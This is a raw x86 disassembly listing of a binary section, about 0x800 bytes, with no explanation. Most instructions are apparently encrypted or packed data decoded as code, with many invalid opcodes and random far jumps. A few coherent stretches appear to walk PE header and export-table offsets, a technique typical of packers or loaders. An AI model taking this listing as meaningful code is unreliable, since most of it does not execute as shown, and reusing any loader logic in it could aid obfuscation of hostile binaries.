  4065b5:	cmp    BYTE PTR [esp+esi*1-0x1e950bd4],0x8a
  4065bd:	dec    ebx
  4065be:	in     eax,0xda
  4065c0:	ins    BYTE PTR es:[edi],dx
  4065c1:	mov    ds:0x8d4327fe,eax
  4065c6:	inc    ebp
  4065c7:	mov    ah,0x74
  4065c9:	push   ebx
  4065ca:	cmc    
  4065cb:	xchg   BYTE PTR [ecx+0x41],bl
  4065ce:	add    BYTE PTR [ebp-0x4f518df6],cl
  4065d4:	into   
  4065d5:	jb     0x4065ad
  4065d7:	jge    0x406651
  4065d9:	out    0x5d,al
  4065db:	loopne 0x406592
  4065dd:	pop    es
  4065de:	mov    edx,0xdee50696
  4065e3:	lods   al,BYTE PTR ds:[esi]
  4065e4:	mov    bl,0xa9
  4065e6:	popf   
  4065e7:	push   edi
  4065e8:	xchg   esi,eax
  4065e9:	leave  
  4065ea:	adc    DWORD PTR [esi],0xffffffd3
  4065ed:	(bad)  
  4065ef:	cmp    eax,0x432b6fc2
  4065f4:	call   eax
  4065f6:	sar    DWORD PTR [ecx+0x57],0x70
  4065fa:	and    eax,0x8ff31fd5
  4065ff:	enter  0xb004,0x9d
  406603:	sub    al,0x3e
  406605:	inc    edi
  406606:	xor    al,bh
  406608:	pop    ecx
  406609:	sar    BYTE PTR [edi],cl
  40660b:	fs out dx,al
  40660d:	sub    dh,0xce
  406610:	and    BYTE PTR [edi],cl
  406612:	repz into 
  406614:	xchg   BYTE PTR [edi+ebp*2],bl
  406617:	or     esp,DWORD PTR [edi+0x5b]
  40661a:	out    dx,eax
  40661b:	jns    0x40660b
  40661d:	and    BYTE PTR [eax],0x29
  406620:	pop    esp
  406621:	call   0xca4e:0x22fc760b
  406628:	mov    al,ds:0xcdb311a8
  40662d:	xor    ebx,DWORD PTR [ebp+0x66]
  406630:	pusha  
  406631:	adc    DWORD PTR [ebx],0xffffffa0
  406634:	sbb    DWORD PTR [ebp-0x5a7bc806],edx
  40663a:	sub    al,0x27
  40663c:	fisttp DWORD PTR fs:[edi-0x7e1f7bf6]
  406643:	fdiv   QWORD PTR [esp+edi*4+0x5ad95137]
  40664a:	mov    DWORD PTR [edx+0x0],ebp
  40664d:	clc    
  40664e:	sub    edx,ebx
  406650:	loope  0x40660d
  406652:	add    al,0x50
  406654:	pop    edi
  406655:	xchg   ebp,eax
  406656:	mov    ds:0x5aa1fbaf,al
  40665b:	pop    ebp
  40665c:	mov    esp,0x5a0df162
  406661:	and    al,0xa3
  406663:	cwde   
  406664:	and    BYTE PTR [edi-0x7f],0x46
  406668:	daa    
  406669:	push   es
  40666a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40666b:	pop    esp
  40666c:	lea    esp,[edi-0x67]
  40666f:	sub    bl,BYTE PTR [eax-0x2e]
  406672:	sbb    ebp,DWORD PTR [ecx]
  406674:	adc    DWORD PTR [ebx],0x538ba5c7
  40667a:	add    al,0x35
  40667c:	ja     0x406633
  40667e:	jns    0x40664b
  406680:	mov    DWORD PTR [ebp+0x14],ecx
  406683:	mov    ecx,0x9c2b8ae8
  406688:	xor    edx,ecx
  40668a:	shrd   eax,edx,0x2
  40668e:	or     eax,DWORD PTR [ebp+0x10]
  406691:	shr    edx,0x2
  406694:	mov    DWORD PTR [ebp-0x70],eax
  406697:	mov    eax,edx
  406699:	or     eax,DWORD PTR [ebp+0x14]
  40669c:	mov    DWORD PTR [ebp-0x5c],edx
  40669f:	jmp    0x406a40
  4066a4:	xchg   ecx,eax
  4066a5:	cld    
  4066a6:	pop    ebx
  4066a7:	cmp    DWORD PTR [edx+eiz*4-0x15230365],0xcd69920c
  4066b2:	sar    DWORD PTR es:[esi-0x424141c5],1
  4066b9:	les    edi,FWORD PTR [esi+0x663aa6be]
  4066bf:	fild   DWORD PTR [esp+edx*8]
  4066c2:	jns    0x4066c3
  4066c4:	fchs   
  4066c6:	imul   edi,DWORD PTR [eax+0x205f9f04],0xffffff99
  4066cd:	sbb    esi,DWORD PTR [edx+ebx*8-0x50eca44b]
  4066d4:	das    
  4066d5:	adc    al,0x5a
  4066d7:	xchg   esp,eax
  4066d8:	push   edi
  4066d9:	leave  
  4066da:	in     eax,0x19
  4066dc:	stos   BYTE PTR es:[edi],al
  4066dd:	pop    edi
  4066de:	add    BYTE PTR [ebx+eiz*1+0x2b0f994e],cl
  4066e5:	push   ebx
  4066e6:	sbb    eax,0x8fb68efc
  4066eb:	lock sbb BYTE PTR [ebx+0x1d4b63c2],bh
  4066f2:	mov    ebx,0x88598324
  4066f7:	fisub  DWORD PTR [edi-0x1c5005e8]
  4066fd:	icebp  
  4066fe:	mov    DWORD PTR [eax-0x4a2c9440],edi
  406704:	add    esp,eax
  406706:	fld    TBYTE PTR [eax+edx*4-0x324d6a]
  40670d:	fcomp  st(2)
  40670f:	jg     0x4066e5
  406711:	mov    esi,edx
  406713:	or     DWORD PTR [edx-0x5c],esi
  406716:	bound  ebx,QWORD PTR es:[esi+0xa30fb7]
  40671d:	rcl    DWORD PTR [ebx+0x78],cl
  406720:	in     eax,0xd1
  406722:	js     0x287cf811
  406728:	sbb    eax,0x734d98b6
  40672d:	test   eax,0xc5b94774
  406732:	cdq    
  406733:	mov    dl,BYTE PTR [ecx+edi*2+0x15]
  406737:	sub    ecx,edi
  406739:	inc    edx
  40673a:	jno    0x40677c
  40673c:	dec    ecx
  40673d:	jle    0x4066f2
  40673f:	out    dx,al
  406740:	sbb    dl,al
  406742:	dec    ebx
  406743:	xchg   ebx,eax
  406744:	test   DWORD PTR [edi+0x13],0xc6d43180
  40674b:	ret    0x2d08
  40674e:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  406750:	add    bh,BYTE PTR [ecx+0x3f4143b6]
  406756:	mov    ecx,0xf7ab7934
  40675b:	rol    DWORD PTR [edx-0x36fe34a3],0x36
  406762:	sbb    ch,BYTE PTR [ebx]
  406764:	fwait
  406765:	adc    eax,0xb75a7dfd
  40676a:	int3   
  40676b:	adc    DWORD PTR [ebx],edi
  40676d:	pop    edi
  40676e:	lods   eax,DWORD PTR ds:[esi]
  40676f:	and    al,0xb5
  406771:	shl    al,0x22
  406774:	das    
  406775:	jb     0x4067ac
  406777:	les    edi,FWORD PTR [esi-0x74]
  40677a:	add    BYTE PTR [edx+edi*4],bl
  40677d:	mov    ah,0x94
  40677f:	imul   edx,DWORD PTR [ebp+0x1a],0xfffffff8
  406783:	ficom  DWORD PTR [edx+ecx*1+0x4b]
  406787:	xor    al,0xfe
  406789:	dec    esi
  40678a:	mov    cl,0x9
  40678c:	cmp    DWORD PTR [ecx+0x262c04c3],esp
  406792:	call   FWORD PTR [eax+0x56]
  406795:	sub    BYTE PTR [ecx+ebx*8+0x6e7751f4],0x11
  40679d:	ret    
  40679e:	dec    cx
  4067a0:	push   ecx
  4067a1:	pop    ebp
  4067a2:	add    al,0xed
  4067a4:	xchg   edx,eax
  4067a5:	ins    BYTE PTR es:[edi],dx
  4067a6:	jne    0x4067b0
  4067a8:	loopne 0x406776
  4067aa:	pusha  
  4067ab:	ins    BYTE PTR es:[edi],dx
  4067ac:	add    bl,dh
  4067ae:	sbb    BYTE PTR [esi-0x54],bh
  4067b1:	xchg   ecx,eax
  4067b2:	pop    eax
  4067b3:	push   edi
  4067b4:	pop    ebx
  4067b5:	aaa    
  4067b6:	pop    eax
  4067b7:	out    0x60,al
  4067b9:	cmp    esi,DWORD PTR [edx-0x250f84df]
  4067bf:	cmp    esi,DWORD PTR [ecx-0x64]
  4067c2:	push   eax
  4067c3:	cmp    eax,0xb161a733
  4067c8:	or     eax,0x2a68e9a6
  4067cd:	push   cs
  4067ce:	cmp    BYTE PTR [eax+0xd],al
  4067d1:	int    0xfb
  4067d3:	sti    
  4067d4:	int    0x15
  4067d6:	pushf  
  4067d7:	dec    edi
  4067d8:	or     BYTE PTR [ecx-0x6483546d],cl
  4067de:	mov    ebp,0x2d96d45f
  4067e3:	lahf   
  4067e4:	pop    es
  4067e5:	(bad)  
  4067e6:	pop    esi
  4067e7:	repz jb 0x40677d
  4067ea:	ins    BYTE PTR es:[edi],dx
  4067eb:	lods   eax,DWORD PTR ds:[esi]
  4067ec:	jbe    0x4067a4
  4067ee:	loope  0x4067eb
  4067f0:	or     eax,0x4b71778
  4067f5:	out    dx,al
  4067f6:	mov    esp,0x4d2a1eda
  4067fb:	cmc    
  4067fc:	lea    edx,[ebp-0x7c]
  4067ff:	mov    eax,ds:0x89f173d2
  406804:	and    eax,0x73a1810d
  406809:	clc    
  40680a:	out    dx,al
  40680b:	fs lahf 
  40680d:	jg     0x4067ff
  40680f:	loopne 0x406824
  406811:	hlt    
  406812:	mov    cl,0x12
  406814:	and    al,0xb5
  406816:	sbb    edx,DWORD PTR [ebp+0x2031e8cc]
  40681c:	push   ecx
  40681d:	push   ecx
  40681e:	les    edi,FWORD PTR [eax-0x7b]
  406821:	(bad)  
  406822:	scas   al,BYTE PTR es:[edi]
  406823:	push   ds
  406824:	test   dh,bh
  406826:	outs   dx,DWORD PTR ds:[esi]
  406827:	fisub  WORD PTR [ebx-0x74fef428]
  40682d:	ds addr16 lahf 
  406830:	add    eax,0x87cc3bf3
  406835:	cmp    DWORD PTR [eax-0x36ec5948],0xa
  40683c:	jmp    0x2c325c6
  406841:	xor    BYTE PTR [edi],dl
  406843:	inc    esi
  406844:	std    
  406845:	sahf   
  406846:	dec    eax
  406847:	inc    ebp
  406848:	retf   0xb5d8
  40684b:	dec    esi
  40684c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40684d:	push   edi
  40684e:	mov    esi,0x4d859b64
  406853:	xor    al,0x7f
  406855:	retf   
  406856:	ror    esp,0x96
  406859:	test   al,0xc7
  40685b:	repnz lock cli 
  40685e:	push   cs
  40685f:	cmp    eax,0xa180f34e
  406864:	dec    ebp
  406865:	dec    esp
  406866:	aaa    
  406867:	in     al,0xfe
  406869:	cmp    DWORD PTR [edi],edx
  40686b:	inc    esi
  40686c:	lahf   
  40686d:	addr16 dec eax
  40686f:	adc    BYTE PTR [edx+0x42ef21fc],0x11
  406876:	popf   
  406877:	lahf   
  406878:	mov    dh,BYTE PTR ds:0xd4ac243c
  40687e:	ins    DWORD PTR es:[edi],dx
  40687f:	(bad)  
  406880:	dec    ebp
  406881:	sbb    esp,ebx
  406883:	lock pop edi
  406885:	add    al,0xfe
  406887:	dec    ebx
  406888:	shr    BYTE PTR [ebx+ebp*1+0x7e3e33cb],cl
  40688f:	xchg   BYTE PTR [ecx+0x3e],bl
  406892:	sbb    ebx,0x2832cd25
  406898:	ficomp WORD PTR [edi+0x10]
  40689b:	shr    DWORD PTR [ebp+0x56c10db9],0xd4
  4068a2:	retf   0xdaf7
  4068a5:	jp     0x40689d
  4068a7:	mov    ebx,0xf8695661
  4068ac:	and    bl,BYTE PTR [edx]
  4068ae:	outs   dx,BYTE PTR ds:[esi]
  4068af:	loop   0x406919
  4068b1:	pop    eax
  4068b2:	(bad)  
  4068b3:	not    BYTE PTR [eax]
  4068b5:	ja     0x406905
  4068b7:	jmp    0x3e7f:0x90f89a5a
  4068be:	add    al,0xbd
  4068c0:	pop    ss
  4068c1:	call   DWORD PTR [edi-0x554006d1]
  4068c7:	ins    DWORD PTR es:[edi],dx
  4068c8:	and    al,0xc0
  4068ca:	lods   al,BYTE PTR ds:[esi]
  4068cb:	repnz or al,BYTE PTR [ebp-0xdeca130]
  4068d2:	ins    DWORD PTR es:[edi],dx
  4068d3:	mov    cl,0x73
  4068d5:	mov    bh,0x54
  4068d7:	jmp    0x363b0bb0
  4068dc:	sbb    eax,0x1c00c56e
  4068e1:	cmp    edi,edi
  4068e3:	icebp  
  4068e4:	push   ds
  4068e5:	xchg   edi,eax
  4068e6:	push   cs
  4068e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068e8:	inc    ebp
  4068e9:	or     eax,0xe6ab30a5
  4068ee:	xor    eax,0x9e2ec5d6
  4068f3:	pop    eax
  4068f4:	jnp    0x4068d6
  4068f6:	mov    al,0x31
  4068f8:	pop    es
  4068f9:	fadd   DWORD PTR [eax]
  4068fb:	enter  0xf524,0x53
  4068ff:	rcr    WORD PTR [edi],0x62
  406903:	and    esp,esi
  406905:	inc    esp
  406906:	jbe    0x4068a6
  406908:	in     al,0xa0
  40690a:	pop    ecx
  40690b:	ss dec edi
  40690d:	jp     0x4068a7
  40690f:	arpl   WORD PTR es:[esi+esi*2],dx
  406913:	adc    BYTE PTR [ebx-0x1e],0x85
  406917:	leave  
  406918:	or     esp,ecx
  40691a:	out    dx,eax
  40691b:	cmp    al,0x6c
  40691d:	in     al,dx
  40691e:	arpl   WORD PTR [eax+0x10],si
  406921:	mov    dl,dh
  406923:	jb     0x4068b9
  406925:	call   0xcfaea853
  40692a:	or     esp,eax
  40692c:	call   0xc2e0:0xcd78f71a
  406933:	aad    0xee
  406935:	xchg   ecx,eax
  406936:	adc    bl,BYTE PTR [edx]
  406938:	lea    esp,[ebp-0x57]
  40693b:	sub    al,0x14
  40693d:	inc    edi
  40693e:	inc    ecx
  40693f:	and    al,0x7f
  406941:	add    cl,bl
  406943:	xchg   BYTE PTR [edi+0xc9b2817],cl
  406949:	add    ecx,DWORD PTR ds:0xaac8d4f
  40694f:	and    edi,DWORD PTR [edx+0x2577aa93]
  406955:	pop    eax
  406956:	arpl   WORD PTR [ebx-0x50],si
  406959:	gs cmc 
  40695b:	inc    ebx
  40695c:	jbe    0x40691c
  40695e:	arpl   WORD PTR ss:[ebp+0x625b4057],dx
  406965:	jbe    0x4068f8
  406967:	imul   edi,DWORD PTR [edx-0x8],0x67851f9e
  40696e:	stc    
  40696f:	rol    ecx,0x7f
  406972:	loopne 0x4069c1
  406974:	cmp    eax,0x65d9800c
  406979:	jbe    0x40699e
  40697b:	sbb    DWORD PTR [ebx],0xa1c1ccfa
  406981:	inc    esp
  406982:	les    ebp,FWORD PTR [ebx+0x3d26c49e]
  406988:	xchg   esp,eax
  406989:	(bad)  
  40698a:	stc    
  40698b:	dec    ecx
  40698c:	pop    ss
  40698d:	xchg   edi,eax
  40698e:	sbb    al,0xdf
  406990:	cmp    bh,bl
  406992:	xor    cl,BYTE PTR [ebx-0x28]
  406995:	outs   dx,DWORD PTR ds:[esi]
  406996:	dec    esi
  406997:	loope  0x406972
  406999:	ja     0x406956
  40699b:	retf   0xa297
  40699e:	pop    es
  40699f:	fisubr DWORD PTR [esi]
  4069a1:	xchg   ecx,eax
  4069a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069a3:	push   ebp
  4069a4:	pop    ecx
  4069a5:	or     al,0x36
  4069a7:	xor    ebp,DWORD PTR [esi]
  4069a9:	popa   
  4069aa:	sbb    eax,DWORD PTR [esi+0x2e]
  4069ad:	lea    ebp,[edi+0x8]
  4069b0:	mov    bh,0x5a
  4069b2:	pop    edx
  4069b3:	sar    BYTE PTR [esi+0x3a],0xd2
  4069b7:	adc    eax,0x7a64f251
  4069bc:	mov    edi,0x61cda9d
  4069c1:	pop    esp
  4069c2:	rol    BYTE PTR [ebp+eiz*2-0x48396cc6],cl
  4069c9:	mov    dl,0xbb
  4069cb:	rol    ebp,cl
  4069cd:	aad    0x78
  4069cf:	xor    DWORD PTR [ecx],ebp
  4069d1:	lea    ebx,[edi]
  4069d3:	xchg   esi,ebx
  4069d5:	push   ss
  4069d6:	mov    al,ds:0x644f6ec8
  4069db:	imul   ecx,DWORD PTR [edx*8+0x1cb4d11],0x7b054a0d
  4069e6:	and    ch,dh
  4069e8:	and    bl,ah
  4069ea:	adc    esp,ebx
  4069ec:	test   eax,0xd9ae2d9a
  4069f1:	mov    ecx,0x32602f85
  4069f6:	dec    edi
  4069f7:	lahf   
  4069f8:	pop    ebp
  4069f9:	dec    edx
  4069fa:	ins    BYTE PTR es:[edi],dx
  4069fb:	lea    edi,[ebx-0x4e5e3a95]
  406a01:	fiadd  WORD PTR [esp+edi*1-0x6447839e]
  406a08:	jb     0x4069e7
  406a0a:	mov    BYTE PTR [edi+eax*8],0x86
  406a0e:	mov    ah,BYTE PTR [edx-0x2]
  406a11:	adc    al,0xa3
  406a13:	pop    esp
  406a14:	(bad)  
  406a15:	mov    ds:0x5a21e789,eax
  406a1a:	jl     0x406a06
  406a1c:	sbb    ebp,ebp
  406a1e:	dec    ebp
  406a1f:	aad    0xc3
  406a21:	imul   ebp,DWORD PTR [ebp-0x5b],0xa4e6956e
  406a28:	repz mov ecx,0x7ec44cb7
  406a2e:	xor    ch,BYTE PTR [ecx+0xaf20287]
  406a34:	std    
  406a35:	adc    ebx,DWORD PTR [ebx+0x24ab741d]
  406a3b:	jmp    0x406a52
  406a3d:	pop    ds
  406a3e:	stc    
  406a3f:	test   BYTE PTR [ecx+0x458b9445],cl
  406a45:	nop
  406a46:	cmp    DWORD PTR [ebp-0x68],eax
  406a49:	jne    0x406a5b
  406a4f:	mov    eax,DWORD PTR [ebp-0x6c]
  406a52:	cmp    DWORD PTR [ebp-0x64],eax
  406a55:	je     0x406a96
  406a5b:	mov    eax,DWORD PTR [ebp+0x8]
  406a5e:	mov    edx,DWORD PTR [ebp+0xc]
  406a61:	mov    edx,DWORD PTR [ebp-0x4]
  406a64:	mov    edx,DWORD PTR [edx+0x3c]
  406a67:	lea    eax,[edx+eax*8+0x78]
  406a6b:	mov    edx,DWORD PTR [ebp-0x4]
  406a6e:	mov    eax,DWORD PTR [edx+eax*1]
  406a71:	mov    DWORD PTR [ebp-0x24],eax
  406a74:	mov    eax,DWORD PTR [esi]
  406a76:	mov    edx,DWORD PTR [esi+0x4]
  406a79:	shrd   eax,edx,0x2
  406a7d:	mov    DWORD PTR [ebp+0x14],eax
  406a80:	mov    eax,DWORD PTR [esi]
  406a82:	xor    DWORD PTR [ebp+0x14],edi
  406a85:	shr    edx,0x2
  406a88:	mov    edx,DWORD PTR [esi+0x4]
  406a8b:	xor    edx,edx
  406a8d:	shl    eax,0x1e
  406a90:	or     edx,DWORD PTR [ebp+0x14]
  406a93:	mov    DWORD PTR [ebp-0x28],edx
  406a96:	mov    eax,DWORD PTR [ebp-0x24]
  406a99:	mov    eax,DWORD PTR [ebp-0x24]
  406a9c:	xor    edx,edx
  406a9e:	shld   edx,eax,0x2
  406aa2:	xor    edx,ecx
  406aa4:	mov    DWORD PTR [ebp+0xc],edx
  406aa7:	mov    edx,DWORD PTR [esi]
  406aa9:	shl    eax,0x2
  406aac:	jmp    0x406e4d
  406ab1:	stos   BYTE PTR es:[edi],al
  406ab2:	outs   dx,BYTE PTR ds:[esi]
  406ab3:	jne    0x406a9b
  406ab5:	mov    ecx,0x99b2bae5
  406aba:	add    ebp,DWORD PTR [esi-0x23]
  406abd:	dec    esp
  406abe:	popf   
  406abf:	fst    QWORD PTR [eax-0x4141be43]
  406ac5:	mov    ebp,0x20bebec4
  406aca:	jne    0x406b17
  406acc:	(bad)  
  406acd:	call   0x2bce9792
  406ad2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ad3:	popf   
  406ad4:	fisubr WORD PTR [ecx+0x47]
  406ad7:	mov    WORD PTR [ecx],fs
  406ad9:	repz test BYTE PTR [ebx+0x6d],ah
  406add:	fld    DWORD PTR [esi+0x58]
  406ae0:	cmp    eax,0x1c2061ef
  406ae5:	jecxz  0x406b3d
  406ae7:	mov    edx,es
  406ae9:	fs adc al,0xa5
  406aec:	das    
  406aed:	pop    ebp
  406aee:	popf   
  406aef:	sub    al,0x42
  406af1:	cmp    esi,DWORD PTR [edx-0x48]
  406af4:	jmp    0x6f4ec232
  406af9:	stc    
  406afa:	call   0x1060:0x67a0288
  406b01:	test   edi,esi
  406b03:	test   eax,0xdf433fe1
  406b08:	loope  0x406aa5
  406b0a:	mov    edi,0x64fa6f61
  406b0f:	adc    edx,ecx
  406b11:	ret    
  406b12:	mov    edi,0xc316b05a
  406b17:	and    eax,0xc97f4d8c
  406b1c:	adc    al,0x7e
  406b1e:	xchg   edi,eax
  406b1f:	pop    es
  406b20:	mov    esp,DWORD PTR [edx]
  406b22:	sub    ecx,ecx
  406b24:	jmp    0x406af4
  406b26:	sbb    DWORD PTR [edx],ecx
  406b28:	int3   
  406b29:	xor    al,0xba
  406b2b:	pop    eax
  406b2c:	leave  
  406b2d:	ret    0xdffb
  406b30:	fldz   
  406b32:	fld    TBYTE PTR [edi+0x237369bd]
  406b38:	mov    ch,cl
  406b3a:	das    
  406b3b:	xor    al,0xbe
  406b3d:	icebp  
  406b3e:	das    
  406b3f:	and    al,0xbf
  406b41:	(bad)  
  406b42:	aam    0xcc
  406b44:	daa    
  406b45:	sbb    edi,DWORD PTR [edx]
  406b47:	inc    edx
  406b48:	lods   al,BYTE PTR ds:[esi]
  406b49:	lds    eax,FWORD PTR ds:0x496c0863
  406b4f:	xchg   esp,eax
  406b50:	iret   
  406b51:	cmp    al,0xd0
  406b53:	or     edi,ebp
  406b55:	sbb    ebx,DWORD PTR [edx]
  406b57:	(bad)  
  406b58:	loopne 0x406b16
  406b5a:	ret    0xb06e
  406b5d:	(bad)  
  406b5e:	cmc    
  406b5f:	sbb    DWORD PTR [esi+0x44],edx
  406b62:	out    0x20,eax
  406b64:	ret    0xbb43
  406b67:	dec    esi
  406b68:	pop    esp
  406b69:	or     DWORD PTR [edi],ebx
  406b6b:	xor    DWORD PTR [ecx],esi
  406b6d:	(bad)  
  406b6e:	retf   0x3437
  406b71:	aad    0xaa
  406b73:	gs js  0x406b11
  406b76:	dec    edi
  406b77:	push   edx
  406b78:	mov    ecx,0xb3fc737f
  406b7d:	rol    DWORD PTR [edi+0x3080595],cl
  406b83:	mov    esp,0xdd08d59d
  406b88:	add    BYTE PTR [ebp+0x1baeddec],0x57
  406b8f:	ja     0x406b41
  406b91:	das    
  406b92:	stc    
  406b93:	add    esp,DWORD PTR [ecx]
  406b95:	or     DWORD PTR [ecx-0x16150b45],edi
  406b9b:	pop    esp
  406b9c:	inc    ecx
  406b9d:	mov    al,0xc5
  406b9f:	addr16 mov ebx,0xd7454303
  406ba5:	fsubr  DWORD PTR [esi+eiz*2+0x77]
  406ba9:	pop    esp
  406baa:	jmp    0x3d91:0x38e01db
  406bb1:	jp     0x406b51
  406bb3:	les    ebx,FWORD PTR [ebx-0x3ec0c6a]
  406bb9:	add    al,0x76
  406bbb:	xchg   edx,eax
  406bbc:	test   esi,ecx
  406bbe:	push   ss
  406bbf:	dec    edi
  406bc0:	mov    esp,0xce06e6a5
  406bc5:	iret   
  406bc6:	xchg   esi,eax
  406bc7:	(bad)  
  406bc9:	in     eax,dx
  406bca:	jb     0x406ba7
  406bcc:	mov    WORD PTR [edi],?
  406bce:	rcl    BYTE PTR ds:0xd238fed9,1
  406bd4:	fisub  DWORD PTR [edx+ebp*8-0x1848b4fe]
  406bdb:	mov    cl,0x1f
  406bdd:	mov    ds:0xf4ca1336,eax
  406be2:	sub    edi,DWORD PTR [ecx+0x7b341968]
  406be8:	push   cs
  406be9:	fwait
  406bea:	sbb    edx,DWORD PTR [edi]
  406bec:	add    bh,cl
  406bee:	int3   
  406bef:	leave  
  406bf0:	(bad)  
  406bf1:	cmp    ecx,DWORD PTR [ecx+0x3141f7a3]
  406bf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bf8:	test   DWORD PTR [edi+0x12],ebp
  406bfb:	inc    esp
  406bfc:	adc    eax,0xbc7a256d
  406c01:	pop    ss
  406c02:	mov    eax,0x77352acb
  406c07:	mov    ebx,0xcf00b38d
  406c0c:	xchg   DWORD PTR [edx+0x8ade8f4],esp
  406c12:	repnz test eax,0xe1f170a5
  406c18:	sub    al,0xe4
  406c1a:	inc    edx
  406c1b:	adc    bl,BYTE PTR [ebp+eiz*4+0x6f423a93]
  406c22:	sub    bl,ch
  406c24:	setbe  BYTE PTR [ecx+0x50611787]
  406c2b:	jle    0x406c56
  406c2d:	ja     0x406bc4
  406c2f:	mov    WORD PTR [ecx],gs
  406c31:	je     0x406c53
  406c33:	in     eax,0x8a
  406c35:	ins    DWORD PTR es:[edi],dx
  406c36:	clc    
  406c37:	cmp    ch,al
  406c39:	sub    BYTE PTR [edx],0x2e
  406c3c:	jge    0x406c75
  406c3e:	adc    ch,BYTE PTR [ecx]
  406c40:	mov    edi,0x636a3f44
  406c45:	outs   dx,BYTE PTR ds:[esi]
  406c46:	fadd   QWORD PTR [eax-0x45]
  406c49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c4a:	xor    BYTE PTR [ecx+ebp*1-0x4b28e746],0x81
  406c52:	sub    BYTE PTR [eax-0x63c80a2f],ch
  406c58:	sub    cl,BYTE PTR [ebx]
  406c5a:	push   es
  406c5b:	psraw  mm2,mm1
  406c5e:	inc    ebp
  406c5f:	push   esp
  406c60:	mov    al,ds:0x94d777bc
  406c65:	jnp    0x406ce2
  406c67:	xchg   esp,eax
  406c68:	sar    BYTE PTR [edx-0x210e8bb6],1
  406c6e:	inc    ebx
  406c6f:	sbb    BYTE PTR [ebp-0x7b],ah
  406c72:	mov    edx,DWORD PTR [ebx]
  406c74:	xchg   BYTE PTR [edx-0x10b9d0bd],dl
  406c7a:	mov    ds:0x27db33c8,al
  406c7f:	push   ebp
  406c80:	jno    0x406c2a
  406c82:	in     eax,dx
  406c83:	mov    bl,0x1c
  406c85:	or     BYTE PTR [edx*8-0x4c223596],ch
  406c8c:	inc    ebp
  406c8d:	mov    bl,0x12
  406c8f:	sbb    eax,DWORD PTR [edx+0x63]
  406c92:	mov    WORD PTR [eax+0x76c499d3],?
  406c98:	in     al,0xad
  406c9a:	aam    0xc0
  406c9c:	jmp    0xd96c:0x44b07fd2
  406ca3:	mul    BYTE PTR [ebx+eax*8+0x18]
  406ca7:	into   
  406ca8:	jae    0x406d15
  406caa:	dec    esi
  406cab:	pop    ss
  406cac:	mov    ebp,0x3d1d887d
  406cb1:	cmc    
  406cb2:	(bad)  
  406cb3:	sub    al,0x1b
  406cb5:	add    edi,DWORD PTR [ebx+0x3efe19b5]
  406cbb:	mov    esp,0x75bd51a8
  406cc0:	outs   dx,BYTE PTR ds:[esi]
  406cc1:	loop   0x406c6a
  406cc3:	repnz (bad) 
  406cc5:	dec    esp
  406cc6:	sbb    BYTE PTR [ebp-0x19],dh
  406cc9:	sub    eax,0xf3500716
  406cce:	mov    ds:0x5776e3ee,eax
  406cd3:	retf   0xbd6b
  406cd6:	stos   DWORD PTR es:[edi],eax
  406cd7:	or     DWORD PTR ds:0xd5716269,ebp
  406cdd:	stc    
  406cde:	lea    edi,[ecx+ebp*2]
  406ce1:	out    dx,al
  406ce2:	jb     0x406d1a
  406ce4:	push   ebx
  406ce5:	arpl   WORD PTR [esi+0x7b544879],bx
  406ceb:	jmp    0xb8ac:0x3ce00326
  406cf2:	add    BYTE PTR [esi-0x62ac7b76],dl
  406cf8:	inc    edx
  406cf9:	test   eax,0x82f703bf
  406cfe:	(bad)  
  406d00:	pop    ss
  406d01:	xor    edi,esp
  406d03:	jb     0x406d35
  406d05:	adc    al,0xdb
  406d07:	jo     0x406d1f
  406d09:	add    BYTE PTR [edx-0x1e],ch
  406d0c:	push   ss
  406d0d:	cdq    
  406d0e:	ret    
  406d0f:	aas    
  406d10:	sbb    esi,eax
  406d12:	dec    edx
  406d13:	mov    edi,0x9ceda711
  406d18:	test   al,0xbe
  406d1a:	sbb    DWORD PTR [edi-0x5e6dd856],edi
  406d20:	pop    ebx
  406d21:	adc    ebx,DWORD PTR [edx+0x28]
  406d24:	(bad)  
  406d25:	and    eax,0xcf39d532
  406d2a:	sbb    BYTE PTR [esi+0x3a],ch
  406d2d:	add    BYTE PTR [ebp-0x5a],dl
  406d30:	sbb    BYTE PTR [edx+0x1fa238c6],ch
  406d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d37:	push   ss
  406d38:	and    ecx,DWORD PTR [eax+0x7123355b]
  406d3e:	aad    0x33
  406d40:	mov    ch,0x6b
  406d42:	xchg   esi,eax
  406d43:	or     ebx,esp
  406d45:	push   edi
  406d46:	clc    
  406d47:	xlat   BYTE PTR ds:[ebx]
  406d48:	(bad)  
  406d4a:	pushf  
  406d4b:	dec    ecx
  406d4c:	mov    bh,0xcb
  406d4e:	push   ecx
  406d4f:	mov    cl,0xbf
  406d51:	int    0x3b
  406d53:	adc    al,0xa2
  406d55:	cli    
  406d56:	adc    dl,BYTE PTR [edi+0x32]
  406d59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d5a:	push   ecx
  406d5b:	sahf   
  406d5c:	dec    esp
  406d5d:	sti    
  406d5e:	or     edi,DWORD PTR [ebx]
  406d60:	jmp    0x5c7f:0x49722252
  406d67:	pop    esp
  406d68:	xchg   ebp,eax
  406d69:	add    al,0x8a
  406d6b:	icebp  
  406d6c:	and    eax,0x898e18d4
  406d71:	loope  0x406d12
  406d73:	inc    ecx
  406d74:	dec    ecx
  406d75:	leave  
  406d76:	dec    edx
  406d77:	push   esp
  406d78:	or     eax,0xaa3cc3af
  406d7d:	fnstcw WORD PTR [esi-0x4f]
  406d80:	xchg   ebp,eax
  406d81:	sbb    bh,BYTE PTR [ecx+0x66ceeab]
  406d87:	in     eax,0xb4
  406d89:	xchg   ebp,eax
  406d8a:	mov    al,ds:0x73829dc2
  406d8f:	pop    edx
  406d90:	mov    edx,0xa9bebde
  406d95:	sbb    BYTE PTR [ecx+0x4d3d8ce9],dl
  406d9b:	fsubp  st(7),st
  406d9d:	in     eax,0x1d
  406d9f:	enter  0xcb0d,0x70
  406da3:	inc    esp
  406da4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406da5:	pop    edi
  406da6:	jp     0x406d61
  406da8:	test   eax,0x8c9c15ba
  406dad:	sbb    al,bh
